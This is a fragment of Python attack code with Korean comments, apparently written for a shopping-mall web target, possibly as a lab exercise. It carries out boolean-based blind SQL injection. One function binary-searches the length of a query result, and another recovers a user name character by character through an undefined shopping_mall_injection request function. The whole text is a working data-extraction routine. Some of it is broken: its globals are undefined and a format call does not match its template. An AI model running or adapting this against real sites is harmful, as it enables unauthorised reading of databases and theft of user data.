
def length_search(query,min=1,max=200):
    attack_query = "("+query+")>{}"

    while (max > min):
        avg = (max+min)//2 
        attack_url = attack_query.format(avg)
        if shopping_mall_injection(url,cookies,attack_url)==True: #여기에 쿼리 공격 넣음 
            min = avg+1
        else:
            max = avg
        #print(min,max)  
    return min

def user_search(query,length):
    user_name = ""
    attack_query = "("+query+") > {}"
    for i in range(1,length+1):
        min ,max = 32,128
        while(max > min):
            avg = (min+max)//2
            attack_url = attack_query.format(i,avg)
            #print(attack_url)
            if shopping_mall_injection(url,cookies,attack_url)==True:
                min = avg+1
            else:
                max = avg
        user_name += chr(min)
        print(f'{i}번째 글자 = {chr(min)}')

    print(user_name)
